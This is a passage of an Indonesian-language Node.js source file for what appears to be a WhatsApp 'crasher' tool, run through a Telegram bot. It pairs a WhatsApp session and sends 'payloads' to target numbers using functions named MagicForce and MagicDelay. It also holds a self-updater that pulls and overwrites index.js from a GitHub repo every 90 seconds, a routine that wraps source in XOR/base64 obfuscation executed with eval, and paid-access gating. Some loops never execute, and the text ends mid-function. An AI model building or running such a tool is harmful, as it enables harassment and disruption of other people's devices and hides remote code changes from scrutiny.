// PROJECT BY @quenvalencia #NO APUS CREDIT 

const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const mongoose = require("mongoose");
const { BOT_TOKEN, ID_TELEGRAM, MODE } = require("./config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const { Octokit } = require('@octokit/rest');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}



const UPDATE_FILE_PATH   = "./index.js";
const UPDATE_STATE_FILE  = "./update-state.json";
const NOTIF_TOKEN_FILE   = "./token.json";
const UPDATE_RESTART_FLAG = "./update-restart-pending.json";
const UPDATE_CHECK_INTERVAL_MS = 90 * 1000;

const ghApi = new Octokit(GH_PAT ? { auth: GH_PAT } : {});

const OWNERS_PATH = "Owners.json";

async function ensureRepoExists() {
  try {
    await ghApi.repos.get({ owner: GH_OWNER, repo: GH_REPO });
    return true;
  } catch (e) {
    if (e.status !== 404) throw e;
    try {
      await ghApi.repos.createForAuthenticatedUser({
        name: GH_REPO,
        private: true,
        auto_init: true,
        description: "Auto-created storage repo (owner binding & update source)",
      });
      console.log(chalk.green(`✅ ☇ Repo ${GH_OWNER}/${GH_REPO} berhasil dibuat otomatis.`));
      return true;
    } catch (createErr) {
      console.error(chalk.red(`❌ ☇ Gagal membuat repo otomatis: ${createErr.message}`));
      return false;
    }
  }
}

async function fetchOwnersMap() {
  try {
    const { data } = await ghApi.repos.getContent({
      owner: GH_OWNER,
      repo: GH_REPO,
      path: OWNERS_PATH,
      ref: GH_BRANCH,
    });
    const content = Buffer.from(data.content, "base64").toString("utf-8");
    return { map: JSON.parse(content || "{}"), sha: data.sha };
  } catch (e) {
    if (e.status === 404) return { map: {}, sha: null };
    console.error(chalk.red(`❌ ☇ Gagal ambil Owners.json: ${e.message}`));
    return { map: null, sha: null };
  }
}

async function saveOwnersMap(map, sha) {
  try {
    await ghApi.repos.createOrUpdateFileContents({
      owner: GH_OWNER,
      repo: GH_REPO,
      path: OWNERS_PATH,
      message: sha ? "chore: update owner binding" : "chore: init owner binding file",
      content: Buffer.from(JSON.stringify(map, null, 2)).toString("base64"),
      branch: GH_BRANCH,
      ...(sha ? { sha } : {}),
    });
    return true;
  } catch (e) {
    console.error(chalk.red(`❌ ☇ Gagal simpan Owners.json: ${e.message}`));
    return false;
  }
}

async function verifyOwnerBinding() {
  const botToken = String(BOT_TOKEN).trim();
  const ownerId = String(ID_TELEGRAM).trim();

  const repoOk = await ensureRepoExists();
  if (!repoOk) {
    console.log(chalk.yellow("⚠️ ☇ Repo owner-binding gak bisa dipastikan, lanjut tanpa verifikasi owner."));
    return true;
  }

  const { map, sha } = await fetchOwnersMap();
  if (map === null) {
    console.log(chalk.yellow("⚠️ ☇ Gagal ambil data owner binding, lanjut tanpa verifikasi owner."));
    return true;
  }

  const registeredOwner = map[botToken];

  if (!registeredOwner) {
  
    map[botToken] = ownerId;
    const saved = await saveOwnersMap(map, sha);
    if (saved) {
      console.log(chalk.green(`✅ ☇ Token didaftarkan ke owner ID ${ownerId}.`));
    } else {
      console.log(chalk.yellow("⚠️ ☇ Gagal daftarin owner binding, lanjut tanpa verifikasi owner."));
    }
    return true;
  }

  if (registeredOwner !== ownerId) {
    console.log(chalk.red(`
⬡═―—―――――――――――――—═⬡
❌ Akses Ditolak ❌
Alasan: Token ini sudah terdaftar ke owner lain.
Terdaftar: ${registeredOwner} | Kamu: ${ownerId}
⬡═―—―――――――――――――—═⬡
`));
    process.exit(1);
  }

  return true;
}

function loadJSON(file, fallback) {
  try {
    if (!fs.existsSync(file)) {
      fs.writeFileSync(file, JSON.stringify(fallback, null, 2));
      return fallback;
    }
    return JSON.parse(fs.readFileSync(file));
  } catch (e) {
    return fallback;
  }
}

function saveJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function getUpdateState() {
  return loadJSON(UPDATE_STATE_FILE, { sha: null, lastUpdate: null });
}

function setUpdateState(sha) {
  saveJSON(UPDATE_STATE_FILE, { sha, lastUpdate: new Date().toISOString() });
}

function getNotifList() {
  return loadJSON(NOTIF_TOKEN_FILE, []);
}

async function fetchRemoteIndex() {
  const { data } = await ghApi.repos.getContent({
    owner: GH_OWNER,
    repo: GH_REPO,
    path: GH_PATH,
    ref: GH_BRANCH,
  });

  let content;
  if (data.content) {
    content = Buffer.from(data.content, "base64").toString("utf-8");
  } else if (data.download_url) {
    const raw = await axios.get(data.download_url, { responseType: "text" });
    content = typeof raw.data === "string" ? raw.data : String(raw.data);
  } else {
    throw new Error("Gagal ambil isi file dari GitHub (content & download_url kosong)");
  }

  if (!content || !content.trim()) {
    throw new Error("Isi file remote index.js kosong, auto-update dibatalkan demi keamanan");
  }

  return { sha: data.sha, content };
}

function encryptSourceForPush(code) {
  const layer1 = code.replace(/\bconst\b/g, "var");
  const b64 = Buffer.from(layer1, "utf8").toString("base64");

  const xorKey = Math.floor(Math.random() * 200) + 30;
  const xorArr = [];
  for (let i = 0; i < b64.length; i++) xorArr.push(b64.charCodeAt(i) ^ xorKey);

  const timestamp = Date.now();
  const salt = Math.random().toString(36).slice(2, 10);
  const k1 = Math.floor(xorKey / 3);
  const k2 = xorKey - k1 * 2;
  const k3 = k1;
  const encodedArr = xorArr.map((n) => `(${n ^ 0x5a}^0x5A)`).join(",");

  return `// Encrypted by Angkasa Dev - ${timestamp}
;(function(_0x${salt},_0x${salt.split("").reverse().join("")}){
var _0x${k1.toString(16)}=${k1},_0x${k2.toString(16)}=${k2},_0x${k3.toString(16)}=${k3};
var _0x${salt}a=_0x${k1.toString(16)}*2+_0x${k2.toString(16)};
var _0x${salt}b=[${encodedArr}];
var _0x${salt}c=[];
for(var _0x${salt}d=0;_0x${salt}d<_0x${salt}b.length;_0x${salt}d++){_0x${salt}c.push(String.fromCharCode(_0x${salt}b[_0x${salt}d]^_0x${salt}a));}
var _0x${salt}e=_0x${salt}c.join("");
var _0x${salt}f=Buffer.from(_0x${salt}e,"base64").toString("utf8");
eval(_0x${salt}f);
})(0,0);`;
}

async function broadcastUpdateNotif(telegram, text) {
  const list = getNotifList();
  for (const chatId of list) {
    try {
      await telegram.sendMessage(chatId, text, { parse_mode: "HTML" });
    } catch (e) {
      console.error(chalk.red(`❌ Gagal kirim notif update ke ${chatId}: ${e.message}`));
    }
  }
}

async function checkAndApplyUpdate({ silent = true } = {}) {
  if (MODE === "developer") return false;

  try {
    const state = getUpdateState();
    const remote = await fetchRemoteIndex();

    if (state.sha && state.sha === remote.sha) {
      if (!silent) console.log(chalk.gray("ℹ️ ☇ Sudah versi terbaru, gak ada update."));
      return false;
    }

    fs.writeFileSync(UPDATE_FILE_PATH, remote.content);
    setUpdateState(remote.sha);
    console.log(chalk.green(`✅ ☇ Auto-update diterapkan (sha: ${remote.sha.slice(0, 7)}), restarting...`));

    const restartNotifText =
      `🆕 <b>Index Versi Terbaru Tersedia</b>\n\n` +
      `Update berhasil diterapkan (sha: <code>${remote.sha.slice(0, 7)}</code>).\n` +
      `♻ Restart akan dimulai dalam 5 detik...`;

    try {
      await bot.telegram.sendMessage(ID_TELEGRAM, restartNotifText, { parse_mode: "HTML" });
    } catch (notifErr) {
      console.error(chalk.red(`❌ ☇ Gagal kirim notif update ke owner: ${notifErr.message}`));
    }
    await broadcastUpdateNotif(bot.telegram, restartNotifText);

    saveJSON(UPDATE_RESTART_FLAG, { pending: true, sha: remote.sha, at: new Date().toISOString() });

    setTimeout(() => process.exit(0), 5000);
    return true;
  } catch (e) {
    console.error(chalk.red("❌ ☇ Gagal cek/terapkan auto-update:", e.message));
    return false;
  }
}

async function notifyIfJustUpdated() {
  try {
    if (!fs.existsSync(UPDATE_RESTART_FLAG)) return;

    const flag = loadJSON(UPDATE_RESTART_FLAG, null);
    fs.unlinkSync(UPDATE_RESTART_FLAG);

    if (!flag || !flag.pending) return;

    const confirmText =
      `✅ <b>Update Berhasil Diterapkan!</b>\n\n` +
      `Index sudah berhasil diganti dengan versi terbaru (sha: <code>${String(flag.sha || "-").slice(0, 7)}</code>) dan bot sudah nyala kembali.`;

    try {
      await bot.telegram.sendMessage(ID_TELEGRAM, confirmText, { parse_mode: "HTML" });
    } catch (e) {
      console.error(chalk.red(`❌ ☇ Gagal kirim notif konfirmasi update ke owner: ${e.message}`));
    }
    await broadcastUpdateNotif(bot.telegram, confirmText);
  } catch (e) {
    console.error(chalk.red(`❌ ☇ Gagal proses notifyIfJustUpdated: ${e.message}`));
  }
}

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);

    if (Array.isArray(response.data)) {
      return response.data;
    }

    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens;
    }

    const raw = JSON.stringify(response.data || "");
    const extracted = raw.match(/\d{5,}:[A-Za-z0-9_\-]{20,}/g);

    return extracted || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.green("🔍 Memeriksa token anda"));

  let validTokens = await fetchValidTokens();

  if (!Array.isArray(validTokens)) {
    validTokens = [];
  }

  const tokenList = validTokens.map(t => String(t).trim());

  const normalizedBotToken = String(BOT_TOKEN).trim();

  if (!tokenList.includes(normalizedBotToken)) {
    console.log(chalk.red(`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⬡═―—―――――――――――――—═⬡⠀⠀⠀
❌ Akses Telah Di Tolak ❌
Alasan: Bot Token lu Belum Ke Daftar Dongo 😹
⬡═―—―――――――――――――—═⬡⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀
`));
    process.exit(1);
  }

  console.log(chalk.green(`✅ Alhamdulillah, token valid!`));

  await verifyOwnerBinding();

  startBot();
}

function startBot() {
  console.log(chalk.red(`

⠀⠀⢠⣤⣤⠀⢠⣤⣤⠀⣤⣤⣤⡀⠀⠀⣤⣤⣤⠀⠀⠀⠀⣤⣤⣤⣤⣤⡄⢠⣤⡀⣤⣤⣤⠀⠀⣠⣤⣤⣤⡄⠀⢠⣤⣤⣤⡄⠀⢠⣤⣤⣄
⠀⠀⠀⢹⣆⠀⢀⣾⠁⠀⢠⡿⠹⣧⠀⠀⠀⣿⠀⠀⠀⠀⠀⢸⡇⢀⡀⠸⠇⠀⣿⢷⡄⢸⡇⠀⣾⠋⠀⠀⠹⠇⠀⠀⠀⣿⠀⠀⠀⠀⣼⠏⢿⡄
⠀⠀⠀⠀⢿⡆⣼⠇⠀⢀⣾⠷⠶⢿⣆⠀⠀⣿⠀⠀⢰⡆⠀⢸⡟⢻⡇⢠⡄⠀⣿⠈⢿⣼⡇⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⣰⡿⠶⠾⣷⡀
⠀⠀⠀⠀⠈⠿⠏⠀⠀⠾⠷⠆⠀⠶⠿⠆⠶⠿⠶⠶⠾⠇⠀⠾⠷⠶⠶⠾⠇⠰⠿⠶⠆⠻⠇⠀⠈⠛⠶⠶⠞⠃⠀⠰⠶⠿⠶⠆⠰⠿⠶⠀⠰⠾⠷

⠀⠀⠀⠀⣠⣤⣤⣤⡄⢠⣤⣤⣤⣄⠀⠀⢠⣤⣤⣄⠀⠀⠀⠀⣠⣤⣤⣤⡄⢠⣤⣤⠀⣤⣤⡄⣤⣤⣤⣤⣤⡄⢠⣤⣤⣤⣄
⠀⠀⠀⣾⠋⠀⠀⠹⠇⠀⣿⠀⠀⣹⡇⠀⠀⣼⠏⢿⡄⠀⠀⢸⣏⡀⠀⠙⠃⠀⣿⣀⣀⣸⡇⠀⢸⡇⢀⡀⠸⠇⠀⣿⠀⠀⣹⡇
⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⣿⠛⠻⣯⡀⠀⣰⡿⠶⠾⣷⡀⠀⢀⡉⠙⠛⢷⡄⠀⣿⠉⠉⢹⡇⠀⢸⡟⢻⡇⢠⡄⠀⣿⠛⠻⣯⡀
⠀⠀⠀⠈⠛⠶⠶⠞⠃⠰⠿⠶⠀⠘⠷⠶⠿⠶⠀⠰⠾⠷⠀⠸⠿⠶⠶⠟⠁⠰⠿⠶⠀⠾⠷⠆⠾⠷⠶⠶⠾⠇⠰⠿⠶⠀⠘⠷⠆
`));
console.log(chalk.blue(`» Information:
☇ Creator : @quenvalencia
☇ Name Script : 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 
☇ Version : 1.0 Latest⠀⠀⠀⠀⠀⠀⠀⠀
`));
}
validateToken();

function formatTarget(number) {
  if (!number) return null;

  number = number.replace(/[^0-9]/g, "");

  if (number.startsWith("0")) {
    number = "62" + number.slice(1);
  }

  return number + "@s.whatsapp.net";
}

class TaskQueue {
  constructor() {
    this.queue = [];
    this.running = false;
  }

  async add(task) {
    this.queue.push(task);
    this.run();
  }

  async run() {
    if (this.running) return;
    this.running = true;

    while (this.queue.length > 0) {
      const job = this.queue.shift();
      try {
        await job();
      } catch (e) {
        console.error("Task error:", e);
      }
    }

    this.running = false;
  }
}

const queue = new TaskQueue();

async function MagicForce(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 3000;
  const totalLoops = 3;

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();

  console.log(`${C.cyan}${C.bold}[#] JOB TELAH DITERIMA | ID: ${taskId}${C.reset}`);
  console.log(`${C.gray}Target: ${target}${C.reset}`);

  for (let i = 10; i <= totalLoops; i++) {
    const loopStart = Date.now();

    try {
    
      await VnFDelayInvisble(sock, target);

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.green}✓${C.reset} Payload Berhasil Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.red}✗${C.reset} Payload Gagal Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset} ${C.red}err:${C.reset} ${err.message}`);
    }

    if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`${C.cyan}${C.bold}[!] JOB TELAH SELESAI | Time: ${totalTime}s${C.reset}\n`);
}

async function MagicDelay(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 3000;
  const totalLoops = 3;

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();

  console.log(`${C.cyan}${C.bold}[#] JOB TELAH DITERIMA | ID: ${taskId}${C.reset}`);
  console.log(`${C.gray}Target: ${target}${C.reset}`);

  for (let i = 10; i <= totalLoops; i++) {
    const loopStart = Date.now();

    try {
    
      await VnFDelayInvisble(sock, target);

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.green}✓${C.reset} Payload Berhasil Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.red}✗${C.reset} Payload Gagal Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset} ${C.red}err:${C.reset} ${err.message}`);
    }

    if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`${C.cyan}${C.bold}[!] JOB TELAH SELESAI | Time: ${totalTime}s${C.reset}\n`);
}

const bot = new Telegraf(BOT_TOKEN);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const startSesi = async () => {
    console.log(chalk.yellow(`
🆕 Latest Update: 24 - 3 - 2026
📂 Information: Hello world
`));
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.19.0'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `\`\`\`JS
⬡═―—⊱ ⎧ ADD PAIRING ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡\`\`\``;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.green(`PAIRING SENDER BERHASIL ✅`));
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();


bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "ZILLXY19");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`JS
⬡═―—⊱ ⎧ ADD PAIRING ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(FotoUtama, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`JS
 ⬡═―—⊱ ⎧ ADD PAIRING ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

function runtime(seconds) {
  seconds = Number(seconds);

  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor((seconds % (3600 * 24)) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);

  const parts = [];
  if (d > 0) parts.push(`${d}d`);
  if (h > 0) parts.push(`${h}h`);
  if (m > 0) parts.push(`${m}m`);
  parts.push(`${s}s`);

  return parts.join(" ");
}

const PREMIUM_FILE = "./premium.json";

function loadPremium() {
  if (!require("fs").existsSync(PREMIUM_FILE)) {
    require("fs").writeFileSync(PREMIUM_FILE, JSON.stringify({}, null, 2));
  }
  return JSON.parse(require("fs").readFileSync(PREMIUM_FILE));
}

function savePremium(data) {
  require("fs").writeFileSync(PREMIUM_FILE, JSON.stringify(data, null, 2));
}

let premiumDB = loadPremium();

const ADMIN_FILE = "./admin.json";

function loadAdmin() {
  if (!require("fs").existsSync(ADMIN_FILE)) {
    require("fs").writeFileSync(ADMIN_FILE, JSON.stringify({}, null, 2));
  }
  return JSON.parse(require("fs").readFileSync(ADMIN_FILE));
}

function saveAdmin(data) {
  require("fs").writeFileSync(ADMIN_FILE, JSON.stringify(data, null, 2));
}

let adminDB = loadAdmin();

function isAdmin(userId) {
  return !!adminDB[userId];
}

function addAdmin(userId) {
  adminDB[userId] = true;
  saveAdmin(adminDB);
}

function delAdmin(userId) {
  delete adminDB[userId];
  saveAdmin(adminDB);
}

function isOwnerOrAdmin(userId) {
  return userId == ID_TELEGRAM || isAdmin(userId);
}

function isPremium(userId) {
  return !!premiumDB[userId];
}

function addPremium(userId, expired) {
  premiumDB[userId] = expired;
  savePremium(premiumDB);
}

function delPremium(userId) {
  delete premiumDB[userId];
  savePremium(premiumDB);
}

function getPremiumExpire(userId) {
  return premiumDB[userId] || null;
}

function addDays(days) {
  return Date.now() + days * 24 * 60 * 60 * 1000;
}

function formatDate(ms) {
  const d = new Date(ms);
  return d.toLocaleString("id-ID");
}

function getPremiumStatus(userId) {
  if (!isPremium(userId)) return "No";

  const exp = getPremiumExpire(userId);

  if (Date.now() > exp) {
    delPremium(userId);
    return "Expired";
  }

  return "Active";
}

setInterval(() => {
  for (let user in premiumDB) {
    if (Date.now() > premiumDB[user]) {
      delete premiumDB[user];
    }
  }
  savePremium(premiumDB);
}, 60000);

function checkPremium() {
  return async (ctx, next) => {
    const userId = String(ctx.from.id);
    const exp = premiumDB[userId];

    if (!exp) {
      return ctx.reply(
        `<b>ACCESS DENIED</b>\n` +
        `❌ Kamu bukan user premium`,
        { parse_mode: "HTML" }
      );
    }

    if (Date.now() > exp) {
      delete premiumDB[userId];
      savePremium(premiumDB);

      return ctx.reply(
        `<b>PREMIUM EXPIRED</b>\n` +
        `⚠️ Masa aktif kamu sudah habis`,
        { parse_mode: "HTML" }
      );
    }

    return next();
  };
}

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkOwner = async (ctx, next) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik", { reply_to_message_id: ctx.message?.message_id });
  }
  return next();
};

const ownerOnly = () => async (ctx, next) => {
  if (!ctx.from) return;
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik", { reply_to_message_id: ctx.message?.message_id });
  }
  return next();
};

function autoFixJS(code) {
  let fixed = code;

  fixed = fixed.replace(/,\s*([}\]])/g, "$1");

  fixed = fixed.replace(/([^\n;{}])\n/g, "$1;\n");

  let open = (fixed.match(/{/g) || []).length;
  let close = (fixed.match(/}/g) || []).length;

  while (close < open) {
    fixed += "\n}";
    close++;
  }

  let o = (fixed.match(/\(/g) || []).length;
  let c = (fixed.match(/\)/g) || []).length;

  while (c < o) {
    fixed += ")";
    c++;
  }

  return fixed;
}

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ID_TELEGRAM) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
